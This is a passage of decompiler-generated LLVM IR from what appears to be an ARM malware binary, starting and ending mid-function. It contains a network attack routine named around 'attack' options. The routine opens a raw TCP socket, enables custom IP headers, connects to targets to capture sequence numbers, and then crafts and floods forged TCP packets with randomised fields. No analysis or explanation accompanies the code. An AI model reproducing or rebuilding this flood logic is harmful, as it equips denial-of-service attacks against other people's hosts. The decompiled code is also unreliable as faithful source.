  store i32 %v0_b4a8, i32* %r0.global-to-local, align 4
  %v5_b4b0 = inttoptr i32 %v0_b49c to i32*
  %v6_b4b0 = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4b0, i32 16, i32 0)
  %v1_b4b8 = urem i32 %v6_b4b0, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b4c4 = load i32, i32* @r5, align 4
  store i32 %v0_b4c4, i32* %r1.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  store i32 %v0_b4c8, i32* %r0.global-to-local, align 4
  %v5_b4d0 = inttoptr i32 %v0_b4c4 to i32*
  %v6_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v5_b4d0, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4e0 = load i32, i32* @r5, align 4
  store i32 %v0_b4e0, i32* %r1.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r4, align 4
  store i32 %v0_b4e4, i32* %r0.global-to-local, align 4
  %v4_b4e8 = inttoptr i32 %v0_b4e0 to i32*
  %v5_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v4_b4e8, i32 1, i32 1)
  %v1_b4f0 = urem i32 %v5_b4e8, 256
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b504 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b504, i32* %r0.global-to-local, align 4
  %v7_b508 = icmp eq i32 %v3_b504, -1
  store i1 %v7_b508, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b504, i32* @sb, align 4
  br i1 %v7_b508, label %dec_label_pc_b6f8, label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b51c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b51c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b530 = call i32 @__GI_setsockopt(i32 %v3_b504, i32 0, i32 3, i32 %v6_b51c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b530, i32* %r0.global-to-local, align 4
  %v7_b534 = icmp eq i32 %v5_b530, -1
  store i1 %v7_b534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b534, label %dec_label_pc_b6f0, label %dec_label_pc_b53c

dec_label_pc_b53c:                                ; preds = %dec_label_pc_b514
  %v0_b53c = load i32, i32* @r7, align 4
  %v3_b53c = mul i32 %v0_b53c, 65536
  store i32 %v3_b53c, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b544 = load i32, i32* @r6, align 4
  %v2_b544 = icmp eq i32 %v0_b544, 0
  store i1 %v2_b544, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b54c = urem i32 %v0_b53c, 65536
  store i32 %v3_b54c, i32* @fp, align 4
  br i1 %v2_b544, label %dec_label_pc_b97c, label %dec_label_pc_b554.preheader

dec_label_pc_b554.preheader:                      ; preds = %dec_label_pc_b53c
  %v2_b5a0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5e4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b61c = ptrtoint i32* %stack_var_-80 to i32
  %v2_b628 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b62c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b68c = zext i8 %tmp to i32
  %v1_b690 = and i32 %v4_b68c, 18
  %v2_b694 = icmp eq i32 %v1_b690, 18
  %v4_b838 = sext i8 %v5_b394 to i32
  %sext = mul i32 %v5_b3b0, 16777216
  %v4_b848 = sdiv i32 %sext, 16777216
  %v3_b678 = sext i16 %tmp61 to i32
  %v1_b69c = and i32 %v4_b68c, 5
  %v2_b69c = icmp eq i32 %v1_b69c, 0
  %v4_b5dc = add i32 %v2_b5a0, 82
  %v5_b5dc = inttoptr i32 %v4_b5dc to i16*
  %v1_b7cc = add i32 %v6_b4d0, 40
  %v1_b8e0 = urem i32 %v5_b410, 2
  %tmp97 = sub nsw i32 0, %v1_b8e0
  %v4_b8e8 = and i32 %tmp97, 32
  %v1_b8f8 = urem i32 %v6_b430, 2
  %tmp98 = sub nsw i32 0, %v1_b8f8
  %v4_b900 = and i32 %tmp98, 16
  %v1_b910 = urem i32 %v6_b450, 2
  %tmp99 = sub nsw i32 0, %v1_b910
  %v4_b918 = and i32 %tmp99, 8
  %v1_b928 = urem i32 %v6_b470, 2
  %tmp100 = sub nsw i32 0, %v1_b928
  %v4_b930 = and i32 %tmp100, 4
  %v1_b940 = urem i32 %v6_b490, 2
  %tmp101 = sub nsw i32 0, %v1_b940
  %v3_b948 = and i32 %tmp101, 2
  %v1_b958 = urem i32 %v6_b4b0, 2
  br label %dec_label_pc_b554

dec_label_pc_b554:                                ; preds = %dec_label_pc_b554.preheader, %dec_label_pc_b6c8
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b6c8 ], [ %tmp34, %dec_label_pc_b554.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b6c8 ], [ %tmp37, %dec_label_pc_b554.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b560 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b560, i32* %r0.global-to-local, align 4
  %v7_b564 = icmp eq i32 %v3_b560, -1
  store i1 %v7_b564, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b560, i32* @r5, align 4
  br i1 %v7_b564, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b570:                                ; preds = %dec_label_pc_b554, %dec_label_pc_b6a4
  %v0_b578 = phi i32 [ %v3_b6b8, %dec_label_pc_b6a4 ], [ %v3_b560, %dec_label_pc_b554 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b6a4 ], [ %stack_var_-62.0, %dec_label_pc_b554 ]
  %stack_var_-60.1 = phi i32 [ %v0_b778, %dec_label_pc_b6a4 ], [ %stack_var_-60.0, %dec_label_pc_b554 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b578 = call i32 @__libc_fcntl(i32 %v0_b578, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b580 = or i32 %v2_b578, 2048
  store i32 %v1_b580, i32* @r2, align 4
  %v0_b584 = load i32, i32* @r5, align 4
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  %v2_b588 = call i32 @__libc_fcntl(i32 %v0_b584, i32 4)
  %v3_b58c = load i32, i32* %stack_var_-44, align 4
  %v5_b594 = mul i32 %v3_b58c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b5a8 = add i32 %v5_b594, %arg2
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v1_b5ac = add i32 %v2_b5a8, 20
  %v2_b5ac = inttoptr i32 %v1_b5ac to i8*
  %v3_b5ac = load i8, i8* %v2_b5ac, align 1
  %v4_b5ac = zext i8 %v3_b5ac to i32
  store i32 %v4_b5ac, i32* %r2.global-to-local, align 4
  %v2_b5b0 = icmp ugt i8 %v3_b5ac, 30
  %v7_b5b0 = icmp eq i8 %v3_b5ac, 31
  store i1 %v7_b5b0, i1* %cpsr_z.global-to-local, align 1
  %v2_b5b4 = xor i1 %v7_b5b0, true
  %v3_b5b4 = and i1 %v2_b5b0, %v2_b5b4
  br i1 %v3_b5b4, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b570
  %v5_b5b4 = add i32 %v2_b5a8, 16
  %v6_b5b4 = inttoptr i32 %v5_b5b4 to i32*
  %v7_b5b4 = load i32, i32* %v6_b5b4, align 4
  store i32 %v7_b5b4, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b570, %bb
  %v4_b5b8 = phi i32 [ %v2_b5a8, %dec_label_pc_b570 ], [ %v7_b5b4, %bb ]
  %v4_b5b8.stack_var_-60.1 = select i1 %v3_b5b4, i32 %v4_b5b8, i32 %stack_var_-60.1
  %v2_b5bc = xor i1 %v2_b5b0, true
  %v3_b5bc = or i1 %v7_b5b0, %v2_b5bc
  br i1 %v3_b5bc, label %dec_label_pc_b704, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %bb71, %dec_label_pc_b704
  %v0_b778 = phi i32 [ %v5_b754, %dec_label_pc_b704 ], [ %v4_b5b8.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b5c8 = load i32, i32* @sl, align 4
  %v9_b5c8 = icmp eq i32 %v0_b5c8, 65535
  store i1 %v9_b5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5c8, label %dec_label_pc_b760, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b5c0
  %v4_b5cc = udiv i32 %v0_b5c8, 256
  %v2_b5d0 = urem i32 %v0_b5c8, 256
  store i32 %v2_b5d0, i32* %r2.global-to-local, align 4
  %v5_b5d4 = mul nuw nsw i32 %v2_b5d0, 256
  %v6_b5d4 = or i32 %v5_b5d4, %v4_b5cc
  store i32 %v6_b5d4, i32* %r3.global-to-local, align 4
  store i32 %v2_b5a0, i32* %r0.global-to-local, align 4
  %v2_b5dc = trunc i32 %v6_b5d4 to i16
  store i16 %v2_b5dc, i16* %v5_b5dc, align 2
  br label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %.thread9, %dec_label_pc_b760
  %stack_var_-62.2 = phi i16 [ %v1_b760, %dec_label_pc_b760 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5e4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r5, align 4
  store i32 %v0_b5ec, i32* %r0.global-to-local, align 4
  %v3_b5f0 = call i32 @__libc_connect(i32 %v0_b5ec, i32 %v2_b5e4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_b5f8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5f8, i32* @r4, align 4
  %v9_b658 = icmp eq i32 %tmp35, %v0_b778
  %v4_b680 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b658 to i32
  %v9_b66c = icmp eq i1 %v9_b658, false
  %v9_b684 = icmp eq i32 %v3_b678, %v4_b680
  br label %dec_label_pc_b614

dec_label_pc_b604:                                ; preds = %.thread, %dec_label_pc_b674, %dec_label_pc_b69c, %bb75
  %v2_b604 = call i32 @__GI_time(i32* null)
  %v0_b608 = load i32, i32* @r4, align 4
  %v2_b608 = sub i32 %v2_b604, %v0_b608
  store i32 %v2_b608, i32* %r0.global-to-local, align 4
  %v7_b60c = icmp eq i32 %v2_b608, 10
  store i1 %v7_b60c, i1* %cpsr_z.global-to-local, align 1
  %v8_b610 = icmp sgt i32 %v2_b608, 10
  br i1 %v8_b610, label %dec_label_pc_b6a4, label %dec_label_pc_b614

dec_label_pc_b614:                                ; preds = %dec_label_pc_b604, %dec_label_pc_b5e4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b628, i32* %r1.global-to-local, align 4
  store i32 %v2_b62c, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b634 = load i32, i32* @sb, align 4
  store i32 %v0_b634, i32* %r0.global-to-local, align 4
  %v6_b63c = call i32 @__libc_recvfrom(i32 %v0_b634, i32 %v2_b628, i32 256, i32 16384, i32 %v2_b61c, i32 %v2_b62c)
  store i32 %v6_b63c, i32* %r2.global-to-local, align 4
  %v7_b644 = icmp eq i32 %v6_b63c, -1
  store i1 %v7_b644, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b644, label %dec_label_pc_b6f8, label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b614
  store i32 %v0_b778, i32* @r1, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b664 = icmp eq i32 %v6_b63c, 40
  store i1 %v7_b664, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b63c, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b650
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b604

bb75:                                             ; preds = %dec_label_pc_b650
  store i1 %v9_b66c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b66c, label %dec_label_pc_b604, label %dec_label_pc_b674

dec_label_pc_b674:                                ; preds = %bb75
  store i32 %v3_b678, i32* @lr, align 4
  store i32 %v2_b5a0, i32* @r3, align 4
  store i32 %v4_b680, i32* %r2.global-to-local, align 4
  store i1 %v9_b684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b684, label %dec_label_pc_b68c, label %dec_label_pc_b604

dec_label_pc_b68c:                                ; preds = %dec_label_pc_b674
  store i32 %v4_b68c, i32* %r2.global-to-local, align 4
  store i32 %v1_b690, i32* @r3, align 4
  store i1 %v2_b694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b694, label %dec_label_pc_b770, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b68c
  store i1 %v2_b69c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b69c, label %dec_label_pc_b604, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b604
  %v0_b6a4 = load i32, i32* @r5, align 4
  store i32 %v0_b6a4, i32* %r0.global-to-local, align 4
  %v1_b6a8 = call i32 @__GI___libc_close(i32 %v0_b6a4)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b6b8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b6b8, i32* %r0.global-to-local, align 4
  %v3_b6bc = icmp eq i32 %v3_b6b8, -1
  %v8_b6bc = icmp eq i32 %v3_b6b8, -1
  store i1 %v8_b6bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b6b8, i32* @r5, align 4
  br i1 %v3_b6bc, label %dec_label_pc_b6c8, label %dec_label_pc_b570

dec_label_pc_b6c8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b554, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b554 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b6a4 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b554 ], [ %v0_b778, %bb82 ], [ %v0_b778, %dec_label_pc_b6a4 ]
  %v3_b6c8 = load i32, i32* %stack_var_-44, align 4
  %v1_b6cc = add i32 %v3_b6c8, 1
  store i32 %v1_b6cc, i32* @r3, align 4
  %v1_b6d0 = load i32, i32* @r6, align 4
  %v9_b6d0 = icmp eq i32 %v1_b6cc, %v1_b6d0
  store i1 %v9_b6d0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b6cc, i32* %stack_var_-44, align 4
  %v5_b6d8 = icmp slt i32 %v1_b6cc, %v1_b6d0
  br i1 %v5_b6d8, label %dec_label_pc_b554, label %dec_label_pc_b6dc

dec_label_pc_b6dc:                                ; preds = %dec_label_pc_b6c8
  store i32 %v6_b4d0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b98c

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b514
  %v0_b6f0 = load i32, i32* @sb, align 4
  store i32 %v0_b6f0, i32* %r0.global-to-local, align 4
  %v1_b6f4 = call i32 @__GI___libc_close(i32 %v0_b6f0)
  store i32 %v1_b6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6f8

dec_label_pc_b6f8:                                ; preds = %dec_label_pc_b614, %entry, %dec_label_pc_b6f0
  %v1_b700 = phi i32 [ %v3_b504, %entry ], [ %v1_b6f4, %dec_label_pc_b6f0 ], [ 0, %dec_label_pc_b614 ]
  store i32 %v27_b330, i32* %lr.global-to-local, align 4
  ret i32 %v1_b700

dec_label_pc_b704:                                ; preds = %bb71
  %v1_b704 = add i32 %v4_b5b8, 16
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  store i32 %v3_b704, i32* @r4, align 4
  %v0_b708 = call i32 @rand_next()
  store i32 %v0_b708, i32* %r0.global-to-local, align 4
  %v3_b70c = load i32, i32* %stack_var_-44, align 4
  %v5_b714 = mul i32 %v3_b70c, 24
  %v0_b71c = load i32, i32* @r4, align 4
  %v1_b71c = and i32 %v0_b71c, 16711680
  store i32 %v1_b71c, i32* %ip.global-to-local, align 4
  %v3_b720 = udiv i32 %v0_b71c, 16777216
  %v2_b724 = add i32 %v5_b714, %arg2
  store i32 %v2_b724, i32* %r1.global-to-local, align 4
  %v4_b728 = udiv i32 %v1_b71c, 256
  %v5_b728 = or i32 %v4_b728, %v3_b720
  store i32 %v5_b728, i32* %r2.global-to-local, align 4
  %v1_b72c = and i32 %v0_b71c, 65280
  store i32 %v1_b72c, i32* %r3.global-to-local, align 4
  %v1_b730 = add i32 %v2_b724, 20
  %v2_b730 = inttoptr i32 %v1_b730 to i8*
  %v3_b730 = load i8, i8* %v2_b730, align 1
  %v4_b730 = zext i8 %v3_b730 to i32
  store i32 %v4_b730, i32* %ip.global-to-local, align 4
  %v5_b738 = call i32 @llvm.bswap.i32(i32 %v0_b71c)
  %v7_b73c = lshr i32 %v0_b708, %v4_b730
  %v8_b73c = add i32 %v7_b73c, %v5_b738
  store i32 %v8_b73c, i32* %r2.global-to-local, align 4
  %v1_b740 = and i32 %v8_b73c, 16711680
  store i32 %v1_b740, i32* %r0.global-to-local, align 4
  %v1_b74c = and i32 %v8_b73c, 65280
  store i32 %v1_b74c, i32* %r1.global-to-local, align 4
  %v5_b754 = call i32 @llvm.bswap.i32(i32 %v8_b73c)
  store i32 %v5_b754, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b5c0

dec_label_pc_b760:                                ; preds = %dec_label_pc_b5c0
  %v0_b760 = call i32 @rand_next()
  %v1_b760 = trunc i32 %v0_b760 to i16
  store i32 %v0_b760, i32* %r0.global-to-local, align 4
  store i32 %v2_b5a0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5e4

dec_label_pc_b770:                                ; preds = %dec_label_pc_b68c
  %v3_b770 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b770, i32* @r4, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v5_b778 = mul i32 %v3_b770, 16
  %v6_b778 = add i32 %v5_b778, %v2_b34c
  %v7_b778 = inttoptr i32 %v6_b778 to i32*
  store i32 %v0_b778, i32* %v7_b778, align 4
  %v0_b77c = load i32, i32* @r8, align 4
  %v1_b77c = add i32 %v0_b77c, 4
  %v2_b77c = inttoptr i32 %v1_b77c to i32*
  %v3_b77c = load i32, i32* %v2_b77c, align 4
  store i32 %v3_b77c, i32* %r1.global-to-local, align 4
  %v1_b788 = and i32 %v3_b77c, 65280
  store i32 %v1_b788, i32* %r2.global-to-local, align 4
  store i32 %v2_b34c, i32* %r0.global-to-local, align 4
  %v0_b798 = load i32, i32* @r4, align 4
  %v3_b798 = mul i32 %v0_b798, 16
  %v2_b79c = add i32 %v3_b798, %v2_b34c
  store i32 %v2_b79c, i32* %ip.global-to-local, align 4
  %v5_b7a0 = call i32 @llvm.bswap.i32(i32 %v3_b77c)
  store i32 %v5_b7a0, i32* %r3.global-to-local, align 4
  %v2_b7a4 = add i32 %v2_b79c, 4
  %v3_b7a4 = inttoptr i32 %v2_b7a4 to i32*
  store i32 %v5_b7a0, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* @r8, align 4
  %v1_b7a8 = add i32 %v0_b7a8, 8
  %v2_b7a8 = inttoptr i32 %v1_b7a8 to i32*
  %v3_b7a8 = load i32, i32* %v2_b7a8, align 4
  store i32 %v3_b7a8, i32* %r1.global-to-local, align 4
  %v1_b7ac = and i32 %v3_b7a8, 16711680
  store i32 %v1_b7ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r2.global-to-local, align 4
  %v5_b7c4 = call i32 @llvm.bswap.i32(i32 %v3_b7a8)
  store i32 %v5_b7c4, i32* %r3.global-to-local, align 4
  %v1_b7c8 = add i32 %v0_b7a8, 2
  %v2_b7c8 = inttoptr i32 %v1_b7c8 to i16*
  %v3_b7c8 = load i16, i16* %v2_b7c8, align 2
  %v4_b7c8 = zext i16 %v3_b7c8 to i32
  store i32 %v4_b7c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b7cc, i32* @r7, align 4
  %v0_b7d0 = load i32, i32* @lr, align 4
  %v1_b7d0 = trunc i32 %v0_b7d0 to i16
  %v2_b7d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d0 = add i32 %v2_b7d0, 14
  %v4_b7d0 = inttoptr i32 %v3_b7d0 to i16*
  store i16 %v1_b7d0, i16* %v4_b7d0, align 2
  %v0_b7d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7d4 = trunc i32 %v0_b7d4 to i16
  %v2_b7d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b7d4 = add i32 %v2_b7d4, 12
  %v4_b7d4 = inttoptr i32 %v3_b7d4 to i16*
  store i16 %v1_b7d4, i16* %v4_b7d4, align 2
  %v0_b7d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b7d8 = add i32 %v1_b7d8, 8
  %v3_b7d8 = inttoptr i32 %v2_b7d8 to i32*
  store i32 %v0_b7d8, i32* %v3_b7d8, align 4
  %v0_b7dc = load i32, i32* @r7, align 4
  store i32 %v0_b7dc, i32* @r0, align 4
  %v0_b7e0 = call i32 @malloc()
  store i32 %v0_b7e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b35c, i32* %r3.global-to-local, align 4
  %v2_b7ec = load i32, i32* @r4, align 4
  %v5_b7ec = mul i32 %v2_b7ec, 4
  %v6_b7ec = add i32 %v5_b7ec, %v2_b35c
  %v7_b7ec = inttoptr i32 %v6_b7ec to i32*
  store i32 %v0_b7e0, i32* %v7_b7ec, align 4
  %v3_b7f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7f0, i32* %r2.global-to-local, align 4
  %v0_b7f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7f4 = mul i32 %v3_b7f0, 4
  %v5_b7f4 = add i32 %v0_b7f4, %v4_b7f4
  %v6_b7f4 = inttoptr i32 %v5_b7f4 to i32*
  %v7_b7f4 = load i32, i32* %v6_b7f4, align 4
  store i32 %v7_b7f4, i32* @r4, align 4
  %v1_b7f8 = inttoptr i32 %v7_b7f4 to i8*
  %v2_b7f8 = load i8, i8* %v1_b7f8, align 1
  %tmp103 = urem i8 %v2_b7f8, 16
  %v1_b7fc = zext i8 %tmp103 to i32
  %v1_b800 = or i32 %v1_b7fc, 64
  store i32 %v1_b800, i32* %r3.global-to-local, align 4
  %v1_b804 = trunc i32 %v1_b800 to i8
  store i8 %v1_b804, i8* %v1_b7f8, align 1
  %v0_b808 = load i32, i32* @r4, align 4
  %v1_b808 = inttoptr i32 %v0_b808 to i8*
  %v2_b808 = load i8, i8* %v1_b808, align 1
  %v0_b80c = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b80c, 256
  %v1_b814 = and i8 %v2_b808, -16
  %v1_b818 = or i8 %v1_b814, 5
  %v1_b81c = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b80c, 256
  %v4_b820 = urem i32 %tmp78, 256
  %v5_b820 = or i32 %v4_b820, %v1_b81c
  store i32 %v5_b820, i32* %r2.global-to-local, align 4
  %v0_b824 = load i32, i32* @fp, align 4
  %v1_b824 = urem i32 %v0_b824, 256
  store i32 %v1_b824, i32* %r0.global-to-local, align 4
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  %v3_b82c = udiv i32 %v0_b824, 256
  store i32 %v3_b82c, i32* %r1.global-to-local, align 4
  store i8 %v1_b818, i8* %v1_b808, align 1
  %v0_b834 = load i32, i32* %r1.global-to-local, align 4
  %v1_b834 = load i32, i32* %r0.global-to-local, align 4
  %v4_b834 = mul i32 %v1_b834, 256
  %v5_b834 = or i32 %v4_b834, %v0_b834
  store i32 %v5_b834, i32* %r1.global-to-local, align 4
  store i32 %v4_b838, i32* %r0.global-to-local, align 4
  %v2_b83c = load i32, i32* @r4, align 4
  %v3_b83c = add i32 %v2_b83c, 1
  %v4_b83c = inttoptr i32 %v3_b83c to i8*
  store i8 %v5_b394, i8* %v4_b83c, align 1
  %v0_b840 = load i32, i32* %r1.global-to-local, align 4
  %v1_b840 = trunc i32 %v0_b840 to i16
  %v2_b840 = load i32, i32* @r4, align 4
  %v3_b840 = add i32 %v2_b840, 4
  %v4_b840 = inttoptr i32 %v3_b840 to i16*
  store i16 %v1_b840, i16* %v4_b840, align 2
  %v0_b844 = load i32, i32* %ip.global-to-local, align 4
  %v2_b844 = icmp eq i32 %v0_b844, 0
  store i1 %v2_b844, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b848, i32* %r1.global-to-local, align 4
  %v0_b84c = load i32, i32* %r2.global-to-local, align 4
  %v1_b84c = trunc i32 %v0_b84c to i16
  %v2_b84c = load i32, i32* @r4, align 4
  %v3_b84c = add i32 %v2_b84c, 2
  %v4_b84c = inttoptr i32 %v3_b84c to i16*
  store i16 %v1_b84c, i16* %v4_b84c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b844, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b770
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b770, %bb79
  %v0_b858 = load i32, i32* %r1.global-to-local, align 4
  %v1_b858 = trunc i32 %v0_b858 to i8
  %v2_b858 = load i32, i32* @r4, align 4
  %v3_b858 = add i32 %v2_b858, 8
  %v4_b858 = inttoptr i32 %v3_b858 to i8*
  store i8 %v1_b858, i8* %v4_b858, align 1
  %v0_b85c = load i32, i32* %r3.global-to-local, align 4
  %v1_b85c = trunc i32 %v0_b85c to i8
  %v2_b85c = load i32, i32* @r4, align 4
  %v3_b85c = add i32 %v2_b85c, 9
  %v4_b85c = inttoptr i32 %v3_b85c to i8*
  store i8 %v1_b85c, i8* %v4_b85c, align 1
  %v0_b860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b860, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b860 = load i32, i32* %r2.global-to-local, align 4
  %v2_b860 = trunc i32 %v1_b860 to i16
  %v3_b860 = load i32, i32* @r4, align 4
  %v4_b860 = add i32 %v3_b860, 6
  %v5_b860 = inttoptr i32 %v4_b860 to i16*
  store i16 %v2_b860, i16* %v5_b860, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_24d4c.56 to i32), i32* %r2.global-to-local, align 4
  %v2_b868 = load i32, i32* @global_var_24d4c.56, align 4
  store i32 %v2_b868, i32* %r1.global-to-local, align 4
  %v1_b86c = load i32, i32* @r4, align 4
  %v2_b86c = add i32 %v1_b86c, 12
  %v3_b86c = inttoptr i32 %v2_b86c to i32*
  store i32 %v2_b868, i32* %v3_b86c, align 4
  %v3_b870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b870, i32* %r3.global-to-local, align 4
  store i32 %v2_b34c, i32* %ip.global-to-local, align 4
  %v4_b878 = mul i32 %v3_b870, 16
  %v5_b878 = add i32 %v4_b878, %v2_b34c
  %v6_b878 = inttoptr i32 %v5_b878 to i32*
  %v7_b878 = load i32, i32* %v6_b878, align 4
  store i32 %v7_b878, i32* %r2.global-to-local, align 4
  store i32 %v5_b878, i32* %r3.global-to-local, align 4
  %v1_b884 = load i32, i32* @r4, align 4
  %v2_b884 = add i32 %v1_b884, 16
  %v3_b884 = inttoptr i32 %v2_b884 to i32*
  store i32 %v7_b878, i32* %v3_b884, align 4
  %v0_b888 = load i32, i32* %r3.global-to-local, align 4
  %v1_b888 = add i32 %v0_b888, 12
  %v2_b888 = inttoptr i32 %v1_b888 to i16*
  %v3_b888 = load i16, i16* %v2_b888, align 2
  %v4_b888 = zext i16 %v3_b888 to i32
  store i32 %v4_b888, i32* %r0.global-to-local, align 4
  %v1_b88c = add i32 %v0_b888, 8
  %v2_b88c = inttoptr i32 %v1_b88c to i32*
  %v3_b88c = load i32, i32* %v2_b88c, align 4
  store i32 %v3_b88c, i32* %r1.global-to-local, align 4
  %v2_b890 = load i32, i32* @r4, align 4
  %v3_b890 = add i32 %v2_b890, 20
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
